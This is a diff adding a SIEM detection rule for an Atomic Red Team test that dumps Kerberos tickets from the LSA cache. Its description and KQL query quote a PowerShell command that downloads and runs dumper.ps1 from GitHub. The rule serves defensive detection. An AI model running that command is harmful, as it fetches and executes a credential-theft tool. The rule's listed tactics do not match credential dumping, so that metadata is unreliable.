@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Dump Kerberos Tickets from LSA using dumper.ps1' (GUID: 2dfa3bff-9a27-46db-ab75-7faefdaca732) of technique T1003.004 (OS Credential Dumping: LSA Secrets). Test Description: This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.\nIf the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\\\\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.\nRef: https://github.com/MzHmO/PowershellKerberos/\nAuthor of dumper.ps1: Michael Zhmaylo (@MzHmO). Command/Steps: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2e..."
+from = "now-9m"
+rule_id = "80f15de4-3146-4afa-a84e-46a5e331bfbb"
+language = "kql"
+name = "Atomic Test: T1003.004 - Dump Kerberos Tickets from LSA using dumper.ps1"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1003.004/T1003.004.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1003.004", "2dfa3bff-9a27-46db-ab75-7faefdaca732", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*Invoke-Expression*\\\" AND powershell.script_block_text : \\\"*(New-Object*\\\" AND powershell.script_block_text : \\\"*Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')*\\\" OR (process.command_line : \\\"*Invoke-Expression*\\\" AND process.command_line : \\\"*(New-Object*\\\" AND process.command_line : \\\"*Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1003.004"
+name = "Dump Kerberos Tickets from LSA using dumper.ps1"
+reference = "https://attack.mitre.org/techniques/T1003/004"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1003/004"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1003/004"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1003/004"
+
+
